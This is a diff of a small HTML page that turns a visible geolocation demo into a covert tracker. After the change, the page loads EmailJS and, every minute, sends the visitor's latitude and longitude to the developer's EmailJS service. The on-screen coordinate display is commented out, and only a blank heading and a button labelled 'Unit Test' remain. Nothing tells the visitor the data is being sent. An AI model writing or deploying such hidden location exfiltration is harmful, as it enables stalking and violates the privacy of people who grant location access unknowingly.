@@ -1,36 +1,102 @@
 <!DOCTYPE html>
 <html>
 
-<body onload="getLocation()">
+<head>
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script type="text/javascript">
+    (function () {
+      emailjs.init("EVurlF4Z0LbNW54cD");
+    })();
+  </script>
+</head>
+
+<body>
   <h1></h1>
 
   <button onclick="getLocation()">Unit Test</button>
 
   <p id="demo"></p>
 
-  <script>
+  <!-- <div class="container-section" data-aos="fade-down">
+    <div class="container-contact">
+      <h1 id="contact"></h1>
+      <form class="contact" id="contactForm">
+        <h1 id="formtitle"></h1>
+        <div class="text">
+          <input type="hidden" id="lattitude" required />
+        </div>
+        <div class="text">
+          <input type="hidden" id="longitude" required />
+        </div>
+        <button class="button" id="btn" type="submit" onclick="e()">Send</button>
+      </form>
+    </div> -->
 
-    setInterval(
-      function () {
-      getLocation();
-    }, 2000);
 
-    const x = document.getElementById("demo");
 
-    function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition);
-      } else {
-        x.innerHTML = "Geolocation is not supported by this browser.";
-      }
-    }
-
-    function showPosition(position) {
-      x.innerHTML = "Latitude: " + position.coords.latitude +
-        "<br>Longitude: " + position.coords.longitude;
-    }
-  </script>
-  <footer>Developer</footer>
 </body>
+
+<script>
+
+  setInterval(
+    function () {
+      getLocation();
+    }, 60000);
+
+  const x = document.getElementById("demo");
+
+  function getLocation() {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(showPosition);
+    } else {
+      x.innerHTML = "Unsupported by this browser.";
+    }
+  }
+
+  function showPosition(position) {
+    // x.innerHTML = "Latitude: " + position.coords.latitude +
+    //   "<br>Longitude: " + position.coords.longitude;
+
+
+      var templateParams = {
+      lattitude:  position.coords.latitude,
+      longitude: position.coords.longitude,
+    };
+
+    emailjs.send("rasif", "devtest", templateParams).then(
+      function (response) {
+        console.log("SUCCESS!", response.status, response.text);
+
+      }
+    );
+
+
+
+  }
+
+  // document.querySelector("#contactForm").addEventListener("submit", function (e) {
+  //   var name = document
+  //     .querySelector("#contactForm")
+  //     .getElementsByTagName("input")[0].value;
+  //   var email = document
+  //     .querySelector("#contactForm")
+  //     .getElementsByTagName("input")[1].value;
+  //   e.preventDefault();
+
+  //   var templateParams = {
+  //     lattitude: document.getElementById("lattitude").value,
+  //     longitude: document.getElementById("longitude").value,
+  //   };
+
+  //   emailjs.send("rasif", "devtest", templateParams).then(
+  //     function (response) {
+  //       console.log("SUCCESS!", response.status, response.text);
+
+  //     }
+  //   );
+  //   document.getElementById('lattitude').value = "";
+  //   document.getElementById('longitude').value = "";
+  // });
+</script>
 
 </html>
